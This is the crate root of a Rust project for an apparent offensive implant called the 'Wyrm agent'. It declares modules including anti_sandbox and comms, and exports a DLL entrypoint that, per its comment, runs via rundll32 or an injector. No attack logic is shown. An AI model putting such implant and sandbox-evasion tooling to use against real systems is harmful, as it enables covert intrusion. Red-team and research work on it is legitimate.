#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

use entry::start_wyrm;

mod anti_sandbox;
mod comms;
mod entry;
mod native;
mod utils;
mod wyrm;

/// `run` is the default entrypoint into teh Wyrm agent, and will appear as an export on a DLL. Through this
/// it can be run either via rundll32, or from an injector which calls the function `run`.
#[unsafe(no_mangle)]
pub extern "system" fn run() {
    start_wyrm();
}
